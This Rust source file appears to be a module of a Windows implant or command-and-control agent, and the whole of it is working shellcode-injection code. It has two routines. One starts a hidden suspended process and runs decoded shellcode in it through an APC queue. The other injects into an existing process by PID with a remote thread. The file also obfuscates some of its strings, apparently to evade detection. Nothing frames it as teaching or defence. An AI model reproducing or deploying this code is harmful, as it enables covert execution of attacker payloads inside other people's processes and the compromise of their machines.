use base64::prelude::*;
use std::{
    ffi::{c_void, OsStr},
    io::{Error, ErrorKind, Result},
    mem::{size_of, transmute},
    os::windows::ffi::OsStrExt,
    sync::mpsc::{channel, Receiver},
    thread,
    time::Duration,
};
use windows::{
    core::{HSTRING, PCWSTR, PWSTR},
    Win32::{
        Foundation::{
            BOOL, CloseHandle, GetLastError, HANDLE, HANDLE_FLAG_INHERIT, HANDLE_FLAGS,
            SetHandleInformation, STILL_ACTIVE,
        },
        Security::SECURITY_ATTRIBUTES,
        Storage::FileSystem::ReadFile,
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
                VirtualAllocEx, VirtualProtectEx
            },
            Pipes::CreatePipe,
            Threading::{
                CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessW, CreateRemoteThreadEx,
                GetExitCodeThread, LPPROC_THREAD_ATTRIBUTE_LIST, OpenProcess,
                PROCESS_ALL_ACCESS, PROCESS_INFORMATION, QueueUserAPC, ResumeThread,
                STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOW, STARTUPINFOW_FLAGS
            },
        },
        UI::WindowsAndMessaging::SW_HIDE,
    },
};

struct HandleSend {
    handle: HANDLE,
}

unsafe impl Send for HandleSend {}

// Shellcode injection to new process
// Thanks:
//  https://github.com/postrequest/link/blob/main/src/links/windows/src/nonstd.rs#L108
pub fn shellcode_createprocess(process_name: String, shellcode_b64: String) -> core::result::Result<Vec<u8>, Error> {
    let mut output: Vec<u8> = Vec::new();

    let mut shellcode = BASE64_STANDARD.decode(shellcode_b64.as_bytes()).unwrap();
    let mut shellcode = hex::decode(shellcode).unwrap();
    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void;

    let mut hread_stdin = HANDLE::default();
    let mut hwrite_stdin = HANDLE::default();
    let mut hread_stdout = HANDLE::default();
    let mut hwrite_stdout = HANDLE::default();

    let mut secattr = SECURITY_ATTRIBUTES::default();
    secattr.bInheritHandle = BOOL(true as i32);
    secattr.lpSecurityDescriptor = std::ptr::null_mut() as *mut c_void;

    // Create pipes
    let _ = unsafe {
        CreatePipe(
            &mut hread_stdin,
            &mut hwrite_stdin,
            Some(&mut secattr),
            0,
        )
    };
    let _ = unsafe {
        SetHandleInformation(
            hwrite_stdin,
            HANDLE_FLAG_INHERIT.0 as _,
            HANDLE_FLAGS(0),
        )
    };

    let _ = unsafe {
        CreatePipe(
            &mut hread_stdout,
            &mut hwrite_stdout,
            Some(&mut secattr),
            0,
        )
    };
    let _ = unsafe {
        SetHandleInformation(
            hread_stdout,
            HANDLE_FLAG_INHERIT.0 as _,
            HANDLE_FLAGS(0),
        )
    };

    let mut si = STARTUPINFOW::default();
    si.cb = size_of::<STARTUPINFOW> as u32;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE.0 as u16;
    si.hStdInput = hread_stdin;
    si.hStdOutput = hwrite_stdout;
    si.hStdError = hwrite_stdout;
    
    let mut pi = PROCESS_INFORMATION::default();

    let current_dir = std::env::current_dir().unwrap();
    let current_dir = Some(current_dir.as_path());
    let current_dir_ptr = current_dir
        .map(|path| path.as_os_str().encode_wide().collect::<Vec<u16>>())
        .map(|wide_path| wide_path.as_ptr())
        .unwrap_or(std::ptr::null_mut());

    // Read the output of the shell in thread
    let mut out_buf: Vec<u8> = Vec::new();
    let (tx, rx) = channel::<String>();
    let (tx_kill, rx_kill) = channel::<bool>();
    let tmp_handle = HandleSend {
        handle: hread_stdout,
    };

    thread::spawn(move || {
        let ret = read_from_pipe(tmp_handle.handle, &mut out_buf, &rx_kill);
        match ret {
            Ok(_) => tx.send(String::from_utf8(out_buf).unwrap()).unwrap(),
            Err(_) => tx.send(obfstr::obfstr!("error reading from pipe").to_string()).unwrap(),
        }
    });

    let process_name = process_name + "\0";
    let mut process_name = OsStr::new(&process_name).encode_wide().collect::<Vec<u16>>();

    // Spawn suspended process
    let res = unsafe {
        CreateProcessW(
            PCWSTR::null(),
            PWSTR(process_name.as_mut_ptr()),
            None,
            None,
            true,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            None,
            PCWSTR(current_dir_ptr),// PCWSTR::null(),
            &mut si,
            &mut pi,
        )
    };

    let handle = pi.hProcess;

    // Allocate payload
    let shellcode_addr = unsafe {
        VirtualAllocEx(
            handle,
            None,
            shellcode.len(),
            MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    let mut ret_len: usize = 0;
    let res = unsafe {
        WriteProcessMemory(
            handle,
            shellcode_addr,
            shellcode_ptr,
            shellcode.len(),
            Some(&mut ret_len),
        )
    };

    // Protect
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    let _ = unsafe {
        VirtualProtectEx(
            handle,
            shellcode_addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    // Queue shellcode for execution and resume thread
    let _ = unsafe {
        QueueUserAPC(
            Some(transmute(shellcode_addr)),
            pi.hThread,
            0 as _,
        )
    };

    let _ = unsafe { ResumeThread(pi.hThread) };

    // Close handles
    let _ = unsafe { CloseHandle(handle) };
    let _ = unsafe { CloseHandle(hwrite_stdout) };
    let _ = unsafe { CloseHandle(hread_stdin) };

    // Wait for thread to finish
    loop {
        let mut ret_code: u32 = 0;
        let _ = unsafe {
            GetExitCodeThread(
                pi.hThread,
                &mut ret_code,
            )
        };
        if ret_code == STILL_ACTIVE.0 as u32 {
            continue;
        } else {
            let _ = tx_kill.send(true);
            match rx.recv() {
                Ok(o) => {
                    output = o.into_bytes();
                    break;
                }
                Err(_) => {
                    break;
                }
            }
        }
    }

    if output.len() == 0 {
        output = "Shellcode injection success.".to_string().into_bytes();
    }

    Ok(output)
}

fn read_from_pipe(
    handle: HANDLE,
    buf: &mut Vec<u8>,
    receiver: &Receiver<bool>
) -> Result<usize> {
    
    let mut total_read = 0;
    let receiver = receiver.to_owned();
    let mut complete = false;
    
    loop {
        let mut tmp_buf = [0u8; 10001];
        let mut numberofbytesread: u32 = 0;

        let res = unsafe {
            ReadFile(
                handle,
                Some(&mut tmp_buf),
                Some(&mut numberofbytesread),
                None,
            )
        };

        // println!("res: {:?}", res);
        // println!("numberofbytesread: {:?}", numberofbytesread);

        match res {
            Ok(_) => {
                buf.extend_from_slice(&tmp_buf);
                total_read = total_read + numberofbytesread;

                // println!("buf: {:?}", buf);
                // println!("total_read: {:?}", total_read);
            },
            // Err(ref e) if e.kind() == ErrorKind::BrokenPipe => break,
            Err(_) => break,
        }

        if complete {
            continue;
        }

        match receiver.recv_timeout(Duration::from_millis(100)) {
            Ok(_) => { complete = true; },
            Err(_) => {},
        }
    }
    Ok(total_read as usize)
}

// Shellcode injection to existing process
pub fn shellcode_openprocess(pid: u32, shellcode_b64: String) -> core::result::Result<Vec<u8>, Error> {
    let mut output: Vec<u8> = Vec::new();

    let mut shellcode = BASE64_STANDARD.decode(shellcode_b64.as_bytes()).unwrap();
    let mut shellcode = hex::decode(shellcode).unwrap();
    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void;

    let handle = match unsafe {
        OpenProcess(
            PROCESS_ALL_ACCESS,
            true,
            pid,
        )
    } {
        Ok(h) => h,
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()));
        }
    };

    // Allocate payload
    let shellcode_addr = unsafe {
        VirtualAllocEx(
            handle,
            None,
            shellcode.len(),
            MEM_COMMIT,
            PAGE_READWRITE,
        )
    };

    let mut ret_len: usize = 0;
    let res = unsafe {
        WriteProcessMemory(
            handle,
            shellcode_addr,
            shellcode_ptr,
            shellcode.len(),
            Some(&mut ret_len),
        )
    };

    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    let _ = unsafe {
        VirtualProtectEx(
            handle,
            shellcode_addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    let _ = unsafe {
        CreateRemoteThreadEx(
            handle,
            None,
            0,
            transmute(shellcode_addr),
            None,
            0,
            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
            None,
        )
    };

    // Close handles
    let _ = unsafe { CloseHandle(handle) };

    Ok("Shellcode injection success.".to_string().as_bytes().to_vec())
}